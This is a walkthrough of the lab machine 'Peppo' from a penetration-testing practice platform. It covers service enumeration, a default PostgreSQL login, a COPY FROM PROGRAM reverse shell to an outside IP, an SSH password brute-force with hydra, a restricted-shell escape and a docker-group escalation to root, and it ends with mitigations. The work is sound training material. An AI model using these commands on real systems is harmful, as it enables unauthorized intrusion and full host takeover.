## Introduction
In this walkthrough we will be solving Proving Grounds Hard Windows box Peppo. Let’s start ..
## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open 
```

![image.png](image.png)

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

![image.png](image%201.png)

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

We usually skip SSH.

### Port 113

FreeBSD identd

- ident-user-enum
    
    ```bash
    ident-user-enum $IP 22 113 5432 8080 10000
    ```
    
    ![image.png](image%202.png)
    

### Port 5432

PostgreSQL DB 9.6.0 or later

[Hacktricks PostgreSQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-postgresql.html?highlight=5432#basic-information)

- **Public Exploits**
    
    ```bash
    searchsploit postgresql 9.6
    ```
    
    [PostgreSQL 9.6.1 RCE](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.exploit-db.com/exploits/51247&ved=2ahUKEwjX0djgkOuMAxXmhP0HHQseBJgQFnoECCIQAQ&)usg=AOvVaw0qdG3XfTA3BHs08sbiT-iD
    
    ![image.png](image%203.png)
    
    **Public exploit didn’t work.**
    
- **Authentication**
    
    ```bash
    psql -h $IP -U postgres
    ```
    
    I used default credentials `postgres:postgres` and was able to login:
    
    ![image.png](image%204.png)
    
- **Dumping hashes**
    
    ```bash
    SELECT usename, passwd FROM pg_shadow;
    ```
    
    ![image.png](image%205.png)
    
    ![image.png](image%206.png)
    
    it just returns authentication information of users to PostgreSQL service.
    
- **Command Execution**
    
    ```bash
    COPY kashz FROM PROGRAM "bash -c 'bash -i >& /dev/tcp/192.168.45.191/80 0>&1'"; SELECT * FROM kashz;
    ```
    
    [COPY command executuion](https://kashz.gitbook.io/kashz-jewels/services/postgres)
    
    I got a connection as postgres user.
    
    ![image.png](image%207.png)
    
- Version
    
    ![image.png](image%208.png)
    
    The version is 12, that explains why RCE didn’t work.
    
    PG_VERSION=**12.3-1.pgdg100+1**
    
    I cannot find `local.txt`:
    
    ```bash
    find / -name local.txt &>/dev/null
    ```
    

### Port 10000

- Accessing the web page it just shows:

- **Webmin RCE**

## Web

### Port 8080

![image.png](image%2011.png)

- **Public exploits**
    
    ```bash
    searchsploit Redmine
    ```
    
    ![image.png](image%2012.png)
    
    ```bash
    searchsploit WEBrick
    ```
    
   [WeBrick exploit](https://www.exploit-db.com/exploits/5215)
    
    ![image.png](image%2013.png)
    
- **Default credentials**
    
    ![image.png](image%2014.png)
    

It didn’t allow me to do anything without changing a password so I changed it to `password`.

![image.png](image%2015.png)

It shows us under the settings that Host name and path is `localhost:3000`, but it should have had port `8080`, there is something weird happening here, as in the example even it is shown as `IP:8080`, maybe this service is run in the container or something similar. Let’s check this assumption with our shell as postgres:

The most important indicator is `/.dockerenv` file if it exists then we are in a container.

```bash
[ -f /.dockerenv ] && echo "Inside a Docker container" || echo "Not in a container”
```

![image.png](image%2016.png)

So have containers.

## Loot

- [ ]  eleanor (port 10000)

## Exploitation

From the Loot and identd user enum and nmap scan output we have user `eleanor`, we should brute-force her password, with [hydra](https://www.kali.org/tools/hydra/), first let’s make smart-wordlist for eleanor. The box is created in 2020 summer so I am gonna use 2020:

```text
eleanor
ronaele
peppo
oppep
summer2020
Summer2020
Summer2020!
summer2020!
summer2020@
Summer2020@
root
toor
```

Let’s brute-force ssh with hydra:

```bash
hydra -l eleanor -P password.list $IP ssh
```

That’s it we got a hit! 

![image.png](image%2017.png)

`eleanor:eleanor`

## Credentials

```bash
eleanor:eleanor
```

> We are in a restricted shell, we should escape it, listing bin directory we see one unusual binary to see `ed`, it turns out it is a text editor. In [GTFOBins](https://gtfobins.github.io/#) we not only can leverage sudo | SUID privileges and properties of binaries but also it display possible ways to escape restricted shells, so lets’ check it.
{: .prompt-info }

![image.png](image%2018.png)

First let’s make shell robust:

```bash
/usr/bin/python -c 'import pty; pty.spawn("/bin/bash")'
```

After that fix PATH:

```bash
export PATH=$PATH:/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

![image.png](image%2019.png)

We are a member of quite a lot of groups, but most important for us now is Docker. We were indeed in a docker container let’s list docker containers on a host .

```bash
docker ps
```

![image.png](image%2020.png)

this shows exactly 2 containers that we met before.

## Privilege Escalation

- [ ]  Situational awareness
- [ ]  Exposed Confidential Information
- [ ]  Password Authentication Abuse
- [ ]  Hunting Sensitive Information
- [ ]  Sudo
- [ ]  SUID/SGID
- [ ]  Capabilities
- [ ]  Cron Jobs Abuse
- [ ]  Kernel Exploits
- [ ]  **Check if sudoers file is writable**

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password.

```bash
docker ps
```

![image.png](image%2021.png)

```text
name:ID
postgres:326cfee15738
redmine:71aa857fe988
```

Let’s inspect which folders are mounted in container from host:

```bash
docker inspect 326cfee15738 | grep -A 10 '"Mounts"’
```

![image.png](image%2022.png)
_No mounted direstory path_

I got the same result from redmine container. If either one would have had `/root` or `/` directories mounted, it would be easier as we could access hosts' `/` and `/root` directories. 

> **Volume**: A Docker-managed storage area, stored on the host (typically under `/var/lib/docker/volumes/`). Docker handles the location and lifecycle, making it more portable and easier to manage across systems. Volumes are ideal for persistent data like databases.
{: .prompt-info }

I tried mounting `/` folder but it hanged a lot, then I searched docker in [Docker](https://gtfobins.github.io/gtfobins/docker/#shell), and used provided command with existing container.

```bash
docker run -v /:/mnt -it redmine
```
It would mount host's `/` directory to container's `/mnt` directory where we will be able access host's `/` directory easily.

```bash
docker run -v /:/mnt --rm -it <container-name> chroot /mnt sh
```

- **`docker run`**: Starts a new container from the specified <container-name> image.
- **`v /:/mnt`**: Creates a bind mount, mapping the host's root directory (`/`) to the `/mnt` directory inside the container. This means the container can access the entire host filesystem via `/mnt`.
- **`-rm`**: Automatically removes the container after it exits, so it doesn’t persist.
- **`i`**: Runs the container in interactive mode (keeps STDIN open).
- **`t`**: Allocates a pseudo-TTY (terminal) for an interactive shell.
- **`chroot /mnt`**: Changes the root directory of the container’s process to `/mnt` (which is the host’s `/` due to the bind mount). This effectively makes the host’s filesystem the new root filesystem for the process, so paths like `/bin` will refer to the host’s `/bin`, not the container’s.
- **`sh`**: Runs the sh shell (Bourne shell or a symlink to another shell like bash) in the new chroot environment.

![image.png](image%2023.png)

Now we are root!

## Mitigation

- **Disable Default Credentials**: The use of default credentials (`postgres:postgres` and `eleanor:eleanor`) enabled unauthorized access. All default credentials should be changed during initial setup.
- **Restrict Docker Group Access**: Membership in the `docker` group effectively grants root-level access. Only trusted administrative users should be part of this group.
- **Isolate Containers Properly**: The PostgreSQL and Redmine services were running inside containers but were accessible from the host, and the container had full root access to the host file system. Avoid mounting the entire host file system (`/`) into containers and use container isolation best practices.
- **Limit Command Execution via PostgreSQL**: PostgreSQL’s `COPY` command can be used for command execution when configured insecurely. Limit superuser access, and avoid allowing shell access through database functions.
- **Harden Restricted Shells**: The restricted shell used for `eleanor` was easily bypassed using the `ed` binary. Remove or restrict such escape-capable binaries and enforce proper shell restrictions.
- **Firewall Unnecessary Ports**: The identd (113) service provided unnecessary user enumeration opportunities. Disable or firewall unused ports and services to reduce the attack surface.
